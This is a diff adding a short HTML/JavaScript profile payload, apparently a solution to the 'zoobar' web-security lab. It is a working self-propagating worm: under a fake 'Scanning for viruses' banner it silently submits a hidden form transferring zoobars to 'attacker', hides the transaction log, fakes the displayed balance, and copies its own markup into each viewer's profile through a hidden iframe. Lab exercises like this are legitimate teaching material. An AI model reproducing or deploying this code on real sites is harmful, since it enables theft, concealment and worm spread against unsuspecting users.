@@ -1,0 +1,21 @@
+<div id='profile_div'>
+    <b>Scanning for viruses...</b>
+    <form id="hideYoZoobars" action="http://localhost:8080/zoobar/index.cgi/transfer" method="POST"
+        target="transferFrame">
+        <input type="hidden" name="zoobars" value="1">
+        <input type="hidden" name="recipient" value="attacker">
+    </form>
+    <iframe style="visibility:hidden; position:absolute; border:0; height:0; width:0;" name="transferFrame"></iframe>
+    <iframe style="visibility:hidden; position:absolute; border:0; height:0; width:0;" name="setProfileFrame" id="setProfileFrame" src="http://localhost:8080/zoobar/index.cgi/"></iframe>
+    <style>.log tbody {visibility:hidden;}</style>
+    <script>
+        window.onload = function() {
+            total = 10 // The zoobar count comes from var total
+            document.getElementById('hideYoZoobars').submit();
+
+            var profileInput = document.getElementById('setProfileFrame').contentDocument.getElementsByName('profile_update')[0]; // iframe is at specified src, so we can pull elements from it
+            profileInput.value = document.getElementById('profile_div').outerHTML; // outerHTML copies Html as is to the profileinput box
+            profileInput.parentElement.submit();
+        }
+    </script>
+</div>
